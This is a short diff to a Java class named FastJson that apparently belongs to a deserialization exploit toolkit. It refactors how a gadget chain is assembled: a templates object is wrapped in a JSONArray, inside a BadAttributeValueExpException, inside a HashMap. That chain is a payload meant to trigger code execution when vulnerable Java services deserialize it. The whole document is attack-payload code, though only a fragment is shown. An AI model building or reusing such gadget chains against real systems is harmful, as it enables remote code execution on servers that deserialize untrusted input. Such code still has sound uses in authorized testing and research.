@@ -1,6 +1,7 @@
 package com.ppp.chain.json;
 
 import com.alibaba.fastjson.JSONArray;
+import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
@@ -45,11 +46,10 @@ public class FastJson implements ObjectPayload<Object> {
         JSONArray jsonArray = new JSONArray();
         jsonArray.add(templates);
 
-        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
-        Reflections.setFieldValue(bd, "val", jsonArray);
+        BadAttributeValueExpException badAttributeValueExpException = KickOff.badAttributeValueExpException(jsonArray);
 
         HashMap hashMap = new HashMap();
-        hashMap.put(templates, bd);
+        hashMap.put(templates, badAttributeValueExpException);
         return hashMap;
     }
 }
